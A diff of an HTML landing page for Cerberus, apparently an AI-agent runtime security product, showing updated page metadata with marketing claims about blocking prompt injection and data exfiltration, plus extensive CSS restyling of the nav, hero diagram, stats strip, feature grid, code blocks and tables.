@@ -3,28 +3,42 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Cerberus — Agentic AI Runtime Security</title>
-  <meta name="description" content="Cerberus detects, correlates, and interrupts the Lethal Trifecta attack pattern across all agentic AI systems. One function call. Zero framework changes." />
-  <meta property="og:title" content="Cerberus — Agentic AI Runtime Security" />
-  <meta property="og:description" content="Detects and blocks prompt injection + PII exfiltration attacks in real time. N=285 real API calls validated. 773 tests. npm install @cerberus-ai/core" />
+  <title>Cerberus — Agentic AI Runtime Security Platform</title>
+  <meta name="description" content="Cerberus detects and blocks the Lethal Trifecta attack pattern in AI agents — prompt injection, PII exfiltration, memory contamination — at runtime. 52μs overhead. 0% false positives. N=285 validated." />
+  <meta property="og:title" content="Cerberus — Agentic AI Runtime Security Platform" />
+  <meta property="og:description" content="Real-time threat detection for AI agents. One guard() call. Zero framework changes. N=285 real API calls validated." />
   <meta property="og:type" content="website" />
   <meta name="twitter:card" content="summary_large_image" />
-  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='16' fill='%23dc2626'/><text y='.85em' x='50%' text-anchor='middle' font-size='68' font-family='system-ui'>&#x25A0;</text></svg>" />
+
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
     :root {
-      --bg:       #0a0c10;
-      --surface:  #0f1117;
-      --border:   #1e2230;
-      --red:      #e53e3e;
-      --red-dim:  #9b2c2c;
-      --green:    #38a169;
-      --blue:     #4299e1;
-      --muted:    #6b7280;
-      --text:     #e2e8f0;
-      --text-dim: #94a3b8;
-      --mono:     'JetBrains Mono', 'Fira Code', 'Cascadia Code', monospace;
+      --bg:           #080a0f;
+      --bg-alt:       #0b0e14;
+      --surface:      #0d1018;
+      --surface-2:    #111520;
+      --border:       #1a1f2e;
+      --border-2:     #222840;
+      --red:          #dc2626;
+      --red-bright:   #ef4444;
+      --red-dim:      #991b1b;
+      --red-glow:     rgba(220, 38, 38, 0.15);
+      --blue:         #3b82f6;
+      --blue-dim:     rgba(59, 130, 246, 0.12);
+      --blue-glow:    rgba(59, 130, 246, 0.25);
+      --emerald:      #10b981;
+      --emerald-dim:  rgba(16, 185, 129, 0.12);
+      --gold:         #C4A96B;
+      --text:         #f1f5f9;
+      --text-2:       #cbd5e1;
+      --text-dim:     #64748b;
+      --text-muted:   #475569;
+      --mono:         'JetBrains Mono', 'Fira Code', 'Cascadia Code', ui-monospace, monospace;
     }
 
     html { scroll-behavior: smooth; }
@@ -32,263 +46,879 @@
     body {
       background: var(--bg);
       color: var(--text);
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+      font-family: 'Inter', system-ui, -apple-system, sans-serif;
       font-size: 16px;
       line-height: 1.6;
       -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+      overflow-x: hidden;
     }
 
     a { color: var(--blue); text-decoration: none; }
     a:hover { text-decoration: underline; }
 
-    /* ── Nav ─────────────────────────────────────────────────────────────── */
+    /* ── Company Banner ────────────────────────────────────────────────────── */
+    .company-banner {
+      background: #07070c;
+      border-bottom: 1px solid #12121c;
+      padding: 0 2rem;
+      height: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-size: 0.68rem;
+      letter-spacing: 0.09em;
+      font-family: var(--mono);
+      text-transform: uppercase;
+      position: relative;
+      z-index: 200;
+    }
+
+    .company-banner a {
+      color: var(--gold);
+      text-decoration: none;
+      transition: color 0.15s;
+    }
+    .company-banner a:hover { color: #d4b97b; text-decoration: none; }
+    .company-banner-right { color: #3d3d52; }
+
+    /* ── Nav ────────────────────────────────────────────────────────────────── */
     nav {
       position: sticky;
       top: 0;
       z-index: 100;
-      background: rgba(10, 12, 16, 0.92);
-      backdrop-filter: blur(8px);
+      background: rgba(8, 10, 15, 0.88);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
       border-bottom: 1px solid var(--border);
       padding: 0 2rem;
+      height: 60px;
       display: flex;
       align-items: center;
       justify-content: space-between;
-      height: 56px;
+      gap: 1rem;
     }
 
     .nav-logo {
-      font-family: var(--mono);
-      font-size: 1rem;
-      font-weight: 700;
-      color: var(--text);
-      letter-spacing: -0.02em;
+      display: flex;
+      align-items: center;
+      gap: 0.6rem;
+      text-decoration: none;
+      flex-shrink: 0;
     }
 
-    .nav-logo span { color: var(--red); }
-
-    .nav-links { display: flex; gap: 1.5rem; align-items: center; }
-    .nav-links a { color: var(--text-dim); font-size: 0.875rem; }
-    .nav-links a:hover { color: var(--text); text-decoration: none; }
-
-    .nav-cta {
+    .nav-logo-icon {
+      width: 28px;
+      height: 28px;
       background: var(--red);
-      color: #fff !important;
-      padding: 0.35rem 0.9rem;
       border-radius: 6px;
-      font-size: 0.8rem;
-      font-weight: 600;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
     }
-    .nav-cta:hover { background: var(--red-dim); }
 
-    /* ── Hero ────────────────────────────────────────────────────────────── */
+    .nav-logo-icon svg { width: 16px; height: 16px; fill: #fff; }
+
+    .nav-logo-text {
+      font-size: 1rem;
+      font-weight: 800;
+      letter-spacing: -0.03em;
+      color: #fff;
+    }
+    .nav-logo-text span { color: var(--red); }
+
+    .nav-center {
+      display: flex;
+      align-items: center;
+      gap: 0.25rem;
+    }
+
+    .nav-center a {
+      color: var(--text-2);
+      font-size: 0.875rem;
+      font-weight: 500;
+      padding: 0.4rem 0.75rem;
+      border-radius: 6px;
+      transition: color 0.15s, background 0.15s;
+      text-decoration: none;
+    }
+    .nav-center a:hover { color: #fff; background: rgba(255,255,255,0.05); text-decoration: none; }
+
+    .nav-right {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .nav-right a {
+      font-size: 0.875rem;
+      font-weight: 500;
+      padding: 0.4rem 0.75rem;
+      border-radius: 6px;
+      transition: all 0.15s;
+      text-decoration: none;
+      color: var(--text-2);
+    }
+    .nav-right a:hover { color: #fff; background: rgba(255,255,255,0.05); text-decoration: none; }
+
+    .nav-btn-demo {
+      background: transparent !important;
+      border: 1px solid var(--border-2) !important;
+      color: var(--text-2) !important;
+      padding: 0.4rem 0.9rem !important;
+    }
+    .nav-btn-demo:hover { border-color: var(--blue) !important; color: var(--blue) !important; background: var(--blue-dim) !important; }
+
+    .nav-btn-primary {
+      background: var(--red) !important;
+      color: #fff !important;
+      font-weight: 600 !important;
+      padding: 0.45rem 1.1rem !important;
+      border-radius: 20px !important;
+    }
+    .nav-btn-primary:hover { background: var(--red-bright) !important; color: #fff !important; }
+
+    /* ── Hero ───────────────────────────────────────────────────────────────── */
     .hero {
-      max-width: 900px;
-      margin: 0 auto;
-      padding: 6rem 2rem 4rem;
-      text-align: center;
+      position: relative;
+      overflow: hidden;
+      background: radial-gradient(ellipse 80% 60% at 50% -10%, rgba(220,38,38,0.12) 0%, transparent 70%),
+                  radial-gradient(ellipse 60% 40% at 80% 50%, rgba(59,130,246,0.06) 0%, transparent 60%),
+                  var(--bg);
+      padding: 7rem 2rem 5rem;
     }
 
-    .badge {
-      display: inline-block;
-      background: rgba(229, 62, 62, 0.12);
-      border: 1px solid rgba(229, 62, 62, 0.3);
-      color: var(--red);
-      font-size: 0.75rem;
-      font-weight: 600;
-      letter-spacing: 0.08em;
+    .hero::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background-image:
+        linear-gradient(rgba(26,31,46,0.6) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(26,31,46,0.6) 1px, transparent 1px);
+      background-size: 60px 60px;
+      mask-image: radial-gradient(ellipse 80% 80% at 50% 0%, black 0%, transparent 80%);
+      pointer-events: none;
+    }
+
+    .hero-inner {
+      max-width: 1280px;
+      margin: 0 auto;
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 4rem;
+      align-items: center;
+      position: relative;
+      z-index: 1;
+    }
+
+    .hero-eyebrow {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+      background: rgba(220,38,38,0.1);
+      border: 1px solid rgba(220,38,38,0.25);
+      color: #fca5a5;
+      font-size: 0.72rem;
+      font-weight: 700;
+      letter-spacing: 0.1em;
       text-transform: uppercase;
-      padding: 0.3rem 0.8rem;
+      padding: 0.3rem 0.75rem;
       border-radius: 100px;
       margin-bottom: 1.5rem;
     }
 
-    h1 {
-      font-size: clamp(2rem, 5vw, 3.5rem);
-      font-weight: 800;
-      letter-spacing: -0.04em;
-      line-height: 1.1;
-      margin-bottom: 1.25rem;
+    .hero-eyebrow-dot {
+      width: 6px;
+      height: 6px;
+      background: var(--red-bright);
+      border-radius: 50%;
+      animation: pulse-dot 2s ease-in-out infinite;
     }
 
-    h1 em { color: var(--red); font-style: normal; }
+    @keyframes pulse-dot {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.5; transform: scale(0.8); }
+    }
+
+    .hero h1 {
+      font-size: clamp(2.2rem, 4vw, 3.4rem);
+      font-weight: 900;
+      letter-spacing: -0.04em;
+      line-height: 1.08;
+      margin-bottom: 1.5rem;
+      color: #fff;
+    }
+
+    .hero h1 em {
+      font-style: normal;
+      color: var(--red-bright);
+    }
 
     .hero-sub {
-      font-size: 1.15rem;
+      font-size: 1.1rem;
       color: var(--text-dim);
-      max-width: 640px;
-      margin: 0 auto 2.5rem;
       line-height: 1.7;
+      margin-bottom: 2.5rem;
+      max-width: 480px;
     }
 
-    .hero-actions { display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap; }
+    .hero-actions {
+      display: flex;
+      gap: 0.75rem;
+      flex-wrap: wrap;
+    }
 
     .btn {
       display: inline-flex;
       align-items: center;
-      gap: 0.5rem;
+      gap: 0.45rem;
       padding: 0.7rem 1.5rem;
       border-radius: 8px;
-      font-size: 0.925rem;
+      font-size: 0.95rem;
       font-weight: 600;
       cursor: pointer;
-      transition: opacity 0.15s;
+      transition: all 0.18s ease;
+      text-decoration: none;
+      border: none;
+      white-space: nowrap;
     }
-    .btn:hover { opacity: 0.85; text-decoration: none; }
+    .btn:hover { text-decoration: none; transform: translateY(-1px); }
+    .btn:active { transform: translateY(0); }
 
-    .btn-primary { background: var(--red); color: #fff; }
-    .btn-secondary {
+    .btn-primary {
+      background: var(--red);
+      color: #fff;
+      box-shadow: 0 0 20px rgba(220,38,38,0.3);
+    }
+    .btn-primary:hover { background: var(--red-bright); box-shadow: 0 0 28px rgba(220,38,38,0.45); color: #fff; }
+
+    .btn-pill {
+      border-radius: 100px;
+      padding: 0.7rem 1.75rem;
+    }
+
+    .btn-outline {
       background: transparent;
-      border: 1px solid var(--border);
-      color: var(--text);
+      color: var(--text-2);
+      border: 1px solid var(--border-2);
+    }
+    .btn-outline:hover { background: rgba(255,255,255,0.04); border-color: #2d3550; color: #fff; }
+
+    .btn-blue {
+      background: var(--blue);
+      color: #fff;
+      box-shadow: 0 0 20px var(--blue-glow);
+    }
+    .btn-blue:hover { background: #2563eb; box-shadow: 0 0 28px rgba(59,130,246,0.4); color: #fff; }
+
+    /* ── Hero Diagram ───────────────────────────────────────────────────────── */
+    .hero-diagram {
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
 
-    /* ── Terminal ────────────────────────────────────────────────────────── */
-    .terminal-wrap {
-      max-width: 720px;
-      margin: 3rem auto;
-      background: #0d1117;
-      border: 1px solid var(--border);
-      border-radius: 12px;
+    .threat-diagram {
+      width: 100%;
+      max-width: 480px;
+      background: var(--surface);
+      border: 1px solid var(--border-2);
+      border-radius: 16px;
+      padding: 2rem;
+      position: relative;
       overflow: hidden;
-      text-align: left;
     }
 
-    .terminal-bar {
-      background: #161b22;
-      padding: 0.6rem 1rem;
+    .threat-diagram::before {
+      content: '';
+      position: absolute;
+      top: -1px;
+      left: 0;
+      right: 0;
+      height: 2px;
+      background: linear-gradient(90deg, transparent, var(--red), transparent);
+    }
+
+    .diagram-title {
+      font-size: 0.7rem;
+      font-weight: 700;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      color: var(--text-dim);
+      margin-bottom: 1.5rem;
       display: flex;
       align-items: center;
       gap: 0.5rem;
-      border-bottom: 1px solid var(--border);
     }
 
-    .dot { width: 12px; height: 12px; border-radius: 50%; }
-    .dot-red    { background: #ff5f56; }
-    .dot-yellow { background: #ffbd2e; }
-    .dot-green  { background: #27c93f; }
-
-    .terminal-body {
-      padding: 1.25rem 1.5rem;
-      font-family: var(--mono);
-      font-size: 0.82rem;
-      line-height: 1.75;
-      overflow-x: auto;
+    .diagram-title::before {
+      content: '';
+      width: 6px;
+      height: 6px;
+      background: var(--red-bright);
+      border-radius: 50%;
+      animation: pulse-dot 1.5s ease-in-out infinite;
     }
 
-    .t-dim    { color: var(--muted); }
-    .t-cmd    { color: #7dd3fc; }
-    .t-green  { color: #4ade80; }
-    .t-red    { color: #f87171; }
-    .t-yellow { color: #fbbf24; }
-    .t-white  { color: var(--text); }
-    .t-bold   { font-weight: 700; }
-
-    /* ── Stats bar ───────────────────────────────────────────────────────── */
-    .stats {
+    .flow-row {
       display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      margin-bottom: 0.75rem;
+    }
+
+    .flow-node {
+      background: var(--surface-2);
+      border: 1px solid var(--border-2);
+      border-radius: 8px;
+      padding: 0.5rem 0.85rem;
+      font-size: 0.78rem;
+      font-weight: 600;
+      color: var(--text-2);
+      font-family: var(--mono);
+      white-space: nowrap;
+    }
+
+    .flow-node.agent { border-color: #3b82f6; color: #93c5fd; }
+    .flow-node.attacker { border-color: #991b1b; color: #fca5a5; text-decoration: line-through; opacity: 0.7; }
+    .flow-node.blocked { border-color: var(--red); color: var(--red-bright); }
+
+    .flow-arrow {
+      color: var(--text-muted);
+      font-size: 0.85rem;
+      flex-shrink: 0;
+    }
+
+    .shield-block {
+      background: linear-gradient(135deg, rgba(220,38,38,0.15), rgba(220,38,38,0.05));
+      border: 1px solid rgba(220,38,38,0.4);
+      border-radius: 10px;
+      padding: 0.85rem 1.1rem;
+      margin: 1rem 0;
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .shield-block::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(90deg, transparent, rgba(220,38,38,0.06), transparent);
+      animation: shimmer 3s ease-in-out infinite;
+    }
+
+    @keyframes shimmer {
+      0%, 100% { transform: translateX(-100%); }
+      50% { transform: translateX(100%); }
+    }
+
+    .shield-icon {
+      width: 36px;
+      height: 36px;
+      background: var(--red);
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
       justify-content: center;
-      gap: 3rem;
-      padding: 2rem;
+      flex-shrink: 0;
+      box-shadow: 0 0 16px rgba(220,38,38,0.5);
+    }
+
+    .shield-icon svg { width: 20px; height: 20px; fill: #fff; }
+
+    .shield-label { flex: 1; }
+    .shield-label-title {
+      font-size: 0.82rem;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 0.15rem;
+    }
+    .shield-label-sub {
+      font-size: 0.7rem;
+      color: rgba(252,165,165,0.8);
+      font-family: var(--mono);
+    }
+
+    .shield-score {
+      font-size: 1.5rem;
+      font-weight: 900;
+      color: var(--red-bright);
+      line-height: 1;
+    }
+
+    .shield-score-label {
+      font-size: 0.6rem;
+      color: var(--text-dim);
+      font-family: var(--mono);
+      text-align: center;
+    }
+
+    .layer-pills {
+      display: flex;
+      gap: 0.4rem;
+      flex-wrap: wrap;
+      margin-top: 1rem;
+    }
+
+    .layer-pill {
+      font-size: 0.65rem;
+      font-weight: 700;
+      font-family: var(--mono);
+      padding: 0.2rem 0.55rem;
+      border-radius: 4px;
+      letter-spacing: 0.05em;
+    }
+
+    .layer-pill.l1 { background: rgba(59,130,246,0.15); color: #93c5fd; border: 1px solid rgba(59,130,246,0.25); }
+    .layer-pill.l2 { background: rgba(245,158,11,0.15); color: #fcd34d; border: 1px solid rgba(245,158,11,0.25); }
+    .layer-pill.l3 { background: rgba(220,38,38,0.15); color: #fca5a5; border: 1px solid rgba(220,38,38,0.25); }
+    .layer-pill.l4 { background: rgba(139,92,246,0.15); color: #c4b5fd; border: 1px solid rgba(139,92,246,0.25); }
+    .layer-pill.blocked { background: rgba(220,38,38,0.2); color: var(--red-bright); border: 1px solid rgba(220,38,38,0.4); }
+
+    /* ── Stats Strip ────────────────────────────────────────────────────────── */
+    .stats-strip {
+      background: var(--bg-alt);
       border-top: 1px solid var(--border);
       border-bottom: 1px solid var(--border);
-      flex-wrap: wrap;
+      padding: 2rem;
     }
 
-    .stat { text-align: center; }
-    .stat-num {
-      font-size: 2rem;
-      font-weight: 800;
-      letter-spacing: -0.04em;
-      color: var(--text);
-    }
-    .stat-num.red { color: var(--red); }
-    .stat-label { font-size: 0.8rem; color: var(--muted); margin-top: 0.2rem; }
-
-    /* ── Sections ────────────────────────────────────────────────────────── */
-    section {
-      max-width: 900px;
+    .stats-inner {
+      max-width: 1280px;
       margin: 0 auto;
-      padding: 5rem 2rem;
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 2rem;
     }
 
-    section + section { padding-top: 0; }
+    .stat-item {
+      text-align: center;
+      padding: 0 1rem;
+    }
+
+    .stat-item + .stat-item {
+      border-left: 1px solid var(--border);
+    }
+
+    .stat-num {
+      font-size: 2.2rem;
+      font-weight: 900;
+      letter-spacing: -0.04em;
+      color: #fff;
+      line-height: 1;
+      margin-bottom: 0.4rem;
+    }
+
+    .stat-num.red { color: var(--red-bright); }
+    .stat-num.emerald { color: var(--emerald); }
+
+    .stat-label {
+      font-size: 0.8rem;
+      color: var(--text-dim);
+      line-height: 1.4;
+    }
+
+    /* ── Section scaffolding ────────────────────────────────────────────────── */
+    .section {
+      padding: 6rem 2rem;
+    }
+
+    .section-inner {
+      max-width: 1280px;
+      margin: 0 auto;
+    }
+
+    .section-alt { background: var(--bg-alt); }
+
+    .section-label {
+      font-size: 0.72rem;
+      font-weight: 700;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      color: var(--red-bright);
+      margin-bottom: 0.75rem;
+    }
+
+    .section-label.blue { color: var(--blue); }
+    .section-label.emerald { color: var(--emerald); }
 
     h2 {
-      font-size: 1.75rem;
-      font-weight: 700;
+      font-size: clamp(1.75rem, 3vw, 2.5rem);
+      font-weight: 800;
       letter-spacing: -0.03em;
+      line-height: 1.15;
       margin-bottom: 1rem;
+      color: #fff;
     }
 
-    h2 em { color: var(--red); font-style: normal; }
+    h2 em { font-style: normal; color: var(--red-bright); }
+    h2 em.blue { color: var(--blue); }
+    h2 em.emerald { color: var(--emerald); }
 
     .section-sub {
+      font-size: 1.05rem;
       color: var(--text-dim);
-      margin-bottom: 2.5rem;
-      max-width: 600px;
+      line-height: 1.7;
+      max-width: 580px;
+      margin-bottom: 3.5rem;
     }
 
-    /* ── Attack chain ────────────────────────────────────────────────────── */
-    .chain {
+    .section-divider {
+      height: 1px;
+      background: linear-gradient(90deg, transparent, var(--border-2), transparent);
+      margin: 0;
+    }
+
+    /* ── Threat Section ─────────────────────────────────────────────────────── */
+    .threat-steps {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 1.5px;
+      background: var(--border);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      overflow: hidden;
+      margin-bottom: 3rem;
+    }
+
+    .threat-step {
+      background: var(--surface);
+      padding: 2rem;
+      position: relative;
+      overflow: hidden;
+      transition: background 0.2s;
+    }
+    .threat-step:hover { background: var(--surface-2); }
+
+    .threat-step::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 3px;
+      background: var(--red);
+      opacity: 0.6;
+    }
+
+    .threat-step-num {
+      font-size: 0.65rem;
+      font-weight: 800;
+      letter-spacing: 0.14em;
+      text-transform: uppercase;
+      color: var(--red-bright);
+      font-family: var(--mono);
+      margin-bottom: 0.75rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .threat-step-num-badge {
+      width: 20px;
+      height: 20px;
+      background: rgba(220,38,38,0.2);
+      border: 1px solid rgba(220,38,38,0.3);
+      border-radius: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.7rem;
+      font-weight: 900;
+      color: var(--red-bright);
+    }
+
+    .threat-step-title {
+      font-size: 1.05rem;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 0.6rem;
+    }
+
+    .threat-step-desc {
+      font-size: 0.875rem;
+      color: var(--text-dim);
+      line-height: 1.6;
+    }
+
+    .threat-step-tag {
+      display: inline-block;
+      margin-top: 1rem;
+      font-size: 0.65rem;
+      font-weight: 700;
+      font-family: var(--mono);
+      padding: 0.2rem 0.5rem;
+      border-radius: 4px;
+      background: rgba(220,38,38,0.1);
+      border: 1px solid rgba(220,38,38,0.2);
+      color: #fca5a5;
+      letter-spacing: 0.06em;
+    }
+
+    .trifecta-note {
+      background: rgba(220,38,38,0.06);
+      border: 1px solid rgba(220,38,38,0.18);
+      border-radius: 10px;
+      padding: 1.5rem 2rem;
+      color: var(--text-dim);
+      font-size: 0.9rem;
+      line-height: 1.7;
+    }
+
+    .trifecta-note strong { color: var(--text-2); }
+    .trifecta-note .highlight { color: var(--red-bright); font-weight: 700; }
+
+    /* ── Pipeline ───────────────────────────────────────────────────────────── */
+    .pipeline {
+      display: flex;
+      align-items: stretch;
+      gap: 0;
+      margin-bottom: 3rem;
+      overflow-x: auto;
+      padding-bottom: 0.5rem;
+    }
+
+    .pipeline-layer {
+      flex: 1;
+      min-width: 180px;
+      background: var(--surface);
+      border: 1px solid var(--border-2);
+      border-radius: 0;
+      padding: 1.75rem 1.25rem;
+      position: relative;
+      transition: background 0.2s;
+    }
+
+    .pipeline-layer:first-child { border-radius: 10px 0 0 10px; }
+    .pipeline-layer:last-child { border-radius: 0 10px 10px 0; }
+    .pipeline-layer + .pipeline-layer { border-left: none; }
+
+    .pipeline-layer:hover { background: var(--surface-2); }
+
+    .pipeline-layer-label {
+      font-size: 0.6rem;
+      font-weight: 800;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      font-family: var(--mono);
+      margin-bottom: 0.6rem;
+    }
+
+    .pipeline-layer-label.l1 { color: #93c5fd; }
+    .pipeline-layer-label.l2 { color: #fcd34d; }
+    .pipeline-layer-label.l3 { color: #fca5a5; }
+    .pipeline-layer-label.l4 { color: #c4b5fd; }
+
+    .pipeline-layer-title {
+      font-size: 0.9rem;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 0.4rem;
+    }
+
+    .pipeline-layer-sub {
+      font-size: 0.75rem;
+      color: var(--text-dim);
+      line-height: 1.5;
+    }
+
+    .pipeline-arrow {
+      display: flex;
+      align-items: center;
+      padding: 0 0.1rem;
+      color: var(--text-muted);
+      font-size: 1rem;
+      flex-shrink: 0;
+      background: var(--border);
+      width: 28px;
+    }
+
+    /* ── Features Grid ──────────────────────────────────────────────────────── */
+    .features-grid {
       display: grid;
       grid-template-columns: repeat(3, 1fr);
       gap: 1px;
       background: var(--border);
       border: 1px solid var(--border);
-      border-radius: 10px;
+      border-radius: 12px;
       overflow: hidden;
-      margin-bottom: 2rem;
     }
 
-    .chain-step {
+    .feature-card {
       background: var(--surface);
-      padding: 1.5rem;
+      padding: 2rem;
+      transition: background 0.2s;
+      position: relative;
+    }
+    .feature-card:hover { background: var(--surface-2); }
+
+    .feature-icon {
+      width: 44px;
+      height: 44px;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 1.1rem;
     }
 
-    .chain-num {
-      font-family: var(--mono);
-      font-size: 0.7rem;
-      color: var(--red);
+    .feature-icon svg { width: 22px; height: 22px; }
+
+    .feature-icon.red { background: rgba(220,38,38,0.15); }
+    .feature-icon.red svg { fill: var(--red-bright); }
+    .feature-icon.blue { background: var(--blue-dim); }
+    .feature-icon.blue svg { fill: #93c5fd; }
+    .feature-icon.emerald { background: var(--emerald-dim); }
+    .feature-icon.emerald svg { fill: #6ee7b7; }
+    .feature-icon.amber { background: rgba(245,158,11,0.12); }
+    .feature-icon.amber svg { fill: #fcd34d; }
+    .feature-icon.purple { background: rgba(139,92,246,0.12); }
+    .feature-icon.purple svg { fill: #c4b5fd; }
+    .feature-icon.cyan { background: rgba(6,182,212,0.12); }
+    .feature-icon.cyan svg { fill: #67e8f9; }
+
+    .feature-title {
+      font-size: 1rem;
       font-weight: 700;
-      letter-spacing: 0.1em;
-      text-transform: uppercase;
+      color: #fff;
       margin-bottom: 0.5rem;
     }
 
-    .chain-title {
-      font-weight: 700;
-      font-size: 0.95rem;
-      margin-bottom: 0.4rem;
+    .feature-desc {
+      font-size: 0.85rem;
+      color: var(--text-dim);
+      line-height: 1.65;
     }
 
-    .chain-desc { font-size: 0.82rem; color: var(--text-dim); }
-
-    /* ── Feature grid ────────────────────────────────────────────────────── */
-    .features {
+    /* ── Code Section ───────────────────────────────────────────────────────── */
+    .code-section-inner {
       display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
-      gap: 1rem;
+      grid-template-columns: 1fr 1.4fr;
+      gap: 4rem;
+      align-items: start;
     }
 
-    .feature {
-      background: var(--surface);
-      border: 1px solid var(--border);
+    .code-tabs {
+      display: flex;
+      gap: 0;
+      border-bottom: 1px solid var(--border-2);
+      margin-bottom: 0;
+    }
+
+    .code-tab {
+      padding: 0.6rem 1rem;
+      font-size: 0.78rem;
+      font-weight: 600;
+      color: var(--text-dim);
+      cursor: pointer;
+      border-bottom: 2px solid transparent;
+      transition: color 0.15s;
+      font-family: var(--mono);
+      letter-spacing: -0.01em;
+    }
+
+    .code-tab.active { color: var(--blue); border-bottom-color: var(--blue); }
+    .code-tab:hover { color: var(--text-2); }
+
+    .code-block {
+      background: #080c14;
+      border: 1px solid var(--border-2);
       border-radius: 10px;
-      padding: 1.5rem;
-      transition: border-color 0.2s;
+      overflow: hidden;
     }
 
-    .feature:hover { border-color: var(--red-dim); }
+    .code-header {
+      background: #0d1220;
+      padding: 0.6rem 1rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid var(--border-2);
+    }
 
-    .feature-icon { font-size: 1.5rem; margin-bottom: 0.75rem; }
-    .feature-title { font-weight: 700; font-size: 0.95rem; margin-bottom: 0.4rem; }
-    .feature-desc { font-size: 0.82rem; color: var(--text-dim); line-height: 1.6; }
+    .code-dots { display: flex; gap: 0.4rem; }
+    .code-dot { width: 10px; height: 10px; border-radius: 50%; }
+    .code-dot-r { background: #ff5f56; }
+    .code-dot-y { background: #ffbd2e; }
+    .code-dot-g { background: #27c93f; }
 
-    /* ── Research table ──────────────────────────────────────────────────── */
+    .code-filename {
+      font-size: 0.73rem;
+      font-family: var(--mono);
+      color: var(--text-dim);
+    }
+
+    pre {
+      padding: 1.5rem;
+      font-family: var(--mono);
+      font-size: 0.8rem;
+      line-height: 1.75;
+      overflow-x: auto;
+      color: #9ca3af;
+    }
+
+    .kw { color: #c084fc; }
+    .str { color: #4ade80; }
+    .cmt { color: #4b5563; }
+    .fn { color: #60a5fa; }
+    .num { color: #fb923c; }
+    .ok { color: #4ade80; font-weight: 600; }
+    .err { color: #f87171; font-weight: 600; }
+    .dim { color: #374151; }
+
+    .code-note {
+      margin-top: 1.25rem;
+      padding: 0.9rem 1rem;
+      background: rgba(16,185,129,0.06);
+      border: 1px solid rgba(16,185,129,0.15);
+      border-radius: 8px;
+      font-size: 0.82rem;
+      color: #6ee7b7;
+      font-family: var(--mono);
+      line-height: 1.6;
+    }
+
+    /* ── Integration Tags ───────────────────────────────────────────────────── */
+    .integrations {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+      margin-top: 1.5rem;
+    }
+
+    .int-tag {
+      font-size: 0.78rem;
+      font-weight: 600;
+      font-family: var(--mono);
+      padding: 0.3rem 0.75rem;
+      border-radius: 6px;
+      background: var(--surface-2);
+      border: 1px solid var(--border-2);
+      color: var(--text-dim);
+    }
+
+    .int-tag.live {
+      background: var(--emerald-dim);
+      border-color: rgba(16,185,129,0.25);
+      color: #6ee7b7;
+    }
+
+    .int-tag.planned {
+      opacity: 0.5;
+      border-style: dashed;
+    }
+
+    /* ── Research Tables ────────────────────────────────────────────────────── */
     .table-wrap {
       overflow-x: auto;
-      border: 1px solid var(--border);
+      border: 1px solid var(--border-2);
       border-radius: 10px;
+      margin-bottom: 1.5rem;
     }
 
     table {
@@ -298,632 +928,1024 @@
     }
 
     th {
-      background: var(--surface);
-      padding: 0.75rem 1rem;
+      background: var(--surface-2);
+      padding: 0.7rem 1.1rem;
       text-align: left;
-      font-size: 0.75rem;
-      font-weight: 600;
-      letter-spacing: 0.05em;
+      font-size: 0.7rem;
+      font-weight: 700;
+      letter-spacing: 0.08em;
       text-transform: uppercase;
-      color: var(--muted);
-      border-bottom: 1px solid var(--border);
+      color: var(--text-muted);
+      border-bottom: 1px solid var(--border-2);
     }
 
     td {
-      padding: 0.75rem 1rem;
+      padding: 0.75rem 1.1rem;
       border-bottom: 1px solid var(--border);
       color: var(--text-dim);
+      vertical-align: middle;
     }
 
     tr:last-child td { border-bottom: none; }
-    tr:hover td { background: rgba(255,255,255,0.02); }
